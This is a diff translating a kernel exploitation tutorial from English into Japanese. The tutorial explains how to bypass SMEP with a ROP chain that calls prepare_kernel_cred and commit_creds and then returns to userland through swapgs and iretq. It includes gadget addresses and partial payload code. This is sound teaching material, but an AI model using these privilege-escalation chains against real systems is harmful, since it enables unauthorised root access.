@@ -1,16 +1,16 @@
 ---
-description: Bypassing SMEP by ropping through the kernel
+description: カーネル内で ROP を行って SMEP を回避する
 ---
 
 # Kernel ROP - Privilege Escalation in Kernel Space
 
-The previous approach failed, so let's try and escalate privileges using purely ROP.&#x20;
+前のやり方は失敗したので、純粋に ROP だけで権限昇格を試してみましょう。&#x20;
 
 ## Modifying the Payload
 
 ### Calling prepare\_kernel\_cred()
 
-First, we have to change the ropchain. Start off with finding some useful gadgets and calling `prepare_kernel_cred(0)`:
+まず、ROP チェーンを変更します。役に立つガジェットを探し、`prepare_kernel_cred(0)` を呼び出すところから始めます。
 
 ```c
 uint64_t pop_rdi    =  0xffffffff811e08ec;
@@ -37,13 +37,13 @@ int main() {
 }
 ```
 
-Now comes the trickiest part, which involves moving the result of RAX to RSI before calling `commit_creds()`.
+次が最も厄介な部分で、`commit_creds()` を呼ぶ前に、RAX の結果を RDI に移す必要があります。
 
 ### Moving RAX to RDI for commit\_creds()
 
-This requires stringing together a collection of gadgets (which took me an age to find). See if you can find them!
+これには、ガジェットをいくつか組み合わせる必要があります(見つけるのにとても時間がかかりました)。自分で見つけられるか試してみてください。
 
-I ended up combining these four gadgets:
+私は、次の 4 つのガジェットを組み合わせました。
 
 ```c
 0xffffffff810dcf72: pop rdx; ret
@@ -52,9 +52,9 @@ I ended up combining these four gadgets:
 0xffffffff8126caee: mov rdi, rax; cmp rdi, rdx; jne 0x46cae5; xor eax, eax; ret;
 ```
 
-* **Gadget 1** is used to set RDX to `0`, so we bypass the `jne` in **Gadget 2** and hit `ret`
-* **Gadget 2** and **Gadget 3** move the returned cred struct from RAX to RDX
-* **Gadget 4** moves it from RAX to RDI, then compares RDI to RDX. We need these to be equal to bypass the `jne` and hit the `ret`
+* **ガジェット 1** は RDX を `0` にして、**ガジェット 2** の `jne` を回避し、`ret` に到達するために使います
+* **ガジェット 2** と **ガジェット 3** は、返された cred 構造体を RAX から RDX に移します
+* **ガジェット 4** は、それを RAX から RDI に移した後、RDI と RDX を比較します。`jne` を回避して `ret` に到達するため、この 2 つが等しい必要があります
 
 <pre class="language-c"><code class="lang-c">uint64_t pop_rdx                = 0xffffffff810dcf72;   // pop rdx; ret
 uint64_t mov_rcx_rax            = 0xffffffff811ba595;   // mov rcx, rax; test rdx, rdx; jne 0x3ba58c; ret;
@@ -74,16 +74,16 @@ payload[i++] = commit_creds;
 
 ### Returning to userland
 
-Recall that we need `swapgs` and then `iretq`. Both can be found easily.
+`swapgs` と、その後に `iretq` が必要だったことを思い出してください。どちらも簡単に見つかります。
 
 ```
 0xffffffff8129011e: swapgs; ret;
 0xffffffff81022e1f: iretq; pop rbp; ret;
 ```
 
-The `pop rbp; ret` is not important as `iretq` jumps away anyway.
+`iretq` はどのみち別の場所へジャンプするので、`pop rbp; ret` は重要ではありません。
 
-To simulate the pushing of RIP, CS, SS, etc we just create the stack layout as it would expect - `RIP|CS|RFLAGS|SP|SS`, the reverse of the order they are pushed in.
+RIP、CS、SS などの push を再現するには、期待されるとおりのスタックレイアウトを作るだけです。つまり `RIP|CS|RFLAGS|SP|SS` で、push される順序の逆です。
 
 ```c
 // commit_creds()
@@ -98,7 +98,7 @@ payload[i++] = user_ss;
 payload[i++] = (uint64_t) escalate;
 ```
 
-If we try this now, we successfully escalate privileges!
+これで試すと、権限昇格に成功します。
 
 ## Final Exploit
 
